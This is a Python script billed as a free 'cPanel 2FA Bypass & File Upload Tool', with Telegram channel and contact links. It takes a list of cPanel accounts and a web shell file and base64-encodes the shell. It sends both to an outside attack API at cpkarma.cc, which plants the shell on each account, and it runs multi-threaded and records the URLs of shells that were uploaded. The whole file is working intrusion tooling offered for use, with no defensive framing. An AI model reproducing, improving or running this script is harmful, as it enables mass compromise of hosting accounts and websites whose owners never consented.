import os
import sys
import subprocess
import base64
import requests
import threading
from queue import Queue
from colorama import Fore, init

init(autoreset=True, convert=True)

Q = ["base64", "requests", "colorama", "threading", "queue"]

def sF():
    try:
        W = []
        for module in Q:
            try:
                __import__(module)
            except ImportError:
                W.append(module)
        if W:
            print(f"[!] Missing modules detected: {', '.join(W)}")
            print("[*] Installing missing modules...")
            subprocess.check_call([sys.executable, "-m", "pip", "install"] + W)
            print("[*] Modules installed successfully. Restarting script...")
            os.execv(sys.executable, [sys.executable] + sys.argv)
    except Exception as e:
        print(f"[!] Failed to check or install modules: {str(e)}")
        sys.exit(1)

sF()

def bA():
    os.system('cls' if os.name == 'nt' else 'clear')

def yT(text, hQX):
    return text.center(hQX)

def bNA():
    hXQX = f"""
{Fore.CYAN}╔════════════════════════════════════════════════════════╗
{Fore.GREEN}║        cPanel 2FA Bypass & File Upload Tool (FREE)     ║
{Fore.CYAN}║════════════════════════════════════════════════════════║
{Fore.MAGENTA}║           Channel: https://t.me/KarmaSyndicate         ║
{Fore.CYAN}║════════════════════════════════════════════════════════║
{Fore.YELLOW}║              Contact: https://t.me/xnabob              ║
{Fore.CYAN}╚════════════════════════════════════════════════════════╝
    """
    hQX = os.get_terminal_size().columns
    hXxX = hXQX.strip().split('\n')
    XzA = '\n'.join(yT(line, hQX) for line in hXxX)
    bA()
    print("\n")
    print(XzA)
    print("\n")

def bB(MsA, code=0):
    print(f"\n{Fore.YELLOW}\n[!] Exiting: {MsA}")
    sys.exit(code)

def tX(AX, BX, CX):
    try:
        with open(CX, 'rb') as file:
            DX = base64.b64encode(file.read()).decode('utf-8')
        data = {
            'cpanel_list': BX,
            'shell_file_name': os.path.basename(CX),
            'shell_file_content': DX,
        }
        response = requests.post(AX, data=data)
        if response.status_code == 200:
            try:
                return response.json()
            except ValueError:
                return {'error': 'Invalid JSON response from API.'}
        else:
            return {'error': f"API Error: {response.status_code} - {response.text}"}
    except Exception as e:
        return {'error': f"Failed to send data to API: {str(e)}"}

def vC(AX, BX, CX, EX, lock):
    response = tX(AX, BX, CX)
    with lock:
        with open(EX, 'a') as file:
            if 'results' in response:
                for entry in response['results']:
                    if entry['status'] == 'success':
                        file.write(f"{entry['uploaded_url']}\n")
                        print(f"{Fore.GREEN}[+] Success: {entry['uploaded_url']}")
                    else:
                        print(f"{Fore.RED}[-] Failed: {entry['cpanel_url']} - {entry.get('error', 'Unknown error')}")
            else:
                print(f"{Fore.RED}[-] Error: {BX} - {response.get('error', 'Unknown error')}")

def dQ(AX, FX, CX, EX, gX=5):
    try:
        if not os.path.exists(FX):
            bB(f"List file {FX} not found.", code=1)
        if not os.path.exists(CX):
            bB(f"Shell file {CX} not found.", code=1)
        with open(FX, 'r') as file:
            BXs = [line.strip() for line in file if line.strip()]
        if not BXs:
            bB("cPanel list file is empty.", code=1)
        lock = threading.Lock()
        queue = Queue()
        for BX in BXs:
            queue.put(BX)
        def jI():
            while not queue.empty():
                line = queue.get()
                vC(AX, line, CX, EX, lock)
                queue.task_done()
        print(f"{Fore.CYAN}\n[*] Process has been started...\n")
        threads = [threading.Thread(target=jI) for _ in range(gX)]
        for thread in threads:
            thread.start()
        queue.join()
        for thread in threads:
            thread.join()
        print(f"{Fore.MAGENTA}\n[*] All tasks completed. Results saved to {EX}.")
    except KeyboardInterrupt:
        bB("Process interrupted by user.", code=1)
    except Exception as e:
        bB(f"An unexpected error occurred: {str(e)}", code=1)

if __name__ == "__main__":
    try:
        bNA()
        AX = "https://cpkarma.cc/2FA-Bypass-cP/api.php"
        FX = input(f"{Fore.YELLOW}Enter path to cPanel list file (e.g., list.txt): ").strip()
        CX = input(f"{Fore.YELLOW}Enter path to shell file (e.g., syndicate.php): ").strip()
        EX = "result.txt"
        dQ(AX, FX, CX, EX, gX=10)
    except KeyboardInterrupt:
        bB("\nProcess interrupted by user.", code=1)
    except Exception as e:
        bB(f"\nAn unexpected error occurred: {str(e)}", code=1)
